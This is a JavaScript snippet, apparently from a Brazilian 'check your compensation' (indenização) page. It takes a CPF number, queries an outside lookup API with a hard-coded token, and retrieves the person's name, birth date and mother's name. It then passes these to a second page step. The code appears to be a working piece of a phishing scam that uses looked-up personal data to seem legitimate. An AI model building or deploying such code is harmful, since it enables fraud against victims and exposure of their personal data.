<script>
document.addEventListener("DOMContentLoaded", function () {
    const cpfInput = document.querySelector('input[type="text"]');
    const form = document.querySelector("form");
    const submitButton = form.querySelector("button");

    const errorDiv = document.createElement("div");
    errorDiv.className = "text-red-600 text-sm text-center mt-2";
    cpfInput.parentElement.appendChild(errorDiv);

    function formatarCPF(value) {
        return value
            .replace(/\D/g, "")
            .slice(0, 11)
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }

    function validarCPF(cpf) {
        return cpf.length === 11;
    }

    cpfInput.addEventListener("input", () => {
        let raw = cpfInput.value.replace(/\D/g, "").slice(0, 11);
        cpfInput.value = formatarCPF(raw);

        if (raw.length === 11) {
            submitButton.removeAttribute("disabled");
        } else {
            submitButton.setAttribute("disabled", "");
        }

        errorDiv.textContent = "";
    });

    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const cpf = cpfInput.value.replace(/\D/g, "");
        if (!validarCPF(cpf)) {
            errorDiv.textContent = "CPF inválido";
            return;
        }

        submitButton.textContent = "CONSULTANDO...";
        submitButton.setAttribute("disabled", "");

        fetch(`https://searchapi.dnnl.live/consulta?token_api=8536&cpf=${cpf}`)
            .then(res => res.json())
            .then(data => {
                if (data.dados && data.dados.length > 0 && data.dados[0].CPF) {
                    const dados = data.dados[0];

                    // Encode cada campo para evitar problemas na URL
                    const nome = encodeURIComponent(dados.NOME || "");
                    const nascimento = encodeURIComponent(dados.NASC || "");
                    const mae = encodeURIComponent(dados.NOME_MAE || "");
                    const cpfFormatado = encodeURIComponent(dados.CPF || "");

                   const url = `/02/index.html?nome=${nome}&nascimento=${nascimento}&mae=${mae}&cpf=${cpfFormatado}${window.location.search}`;
window.location.href = url;

                } else {
                    errorDiv.textContent = "CPF inválido";
                    submitButton.textContent = "CONSULTAR INDENIZAÇÃO";
                    submitButton.removeAttribute("disabled");
                }
            })
            .catch(() => {
                errorDiv.textContent = "Erro na consulta. Tente novamente.";
                submitButton.textContent = "CONSULTAR INDENIZAÇÃO";
                submitButton.removeAttribute("disabled");
            });
    });
});
</script>
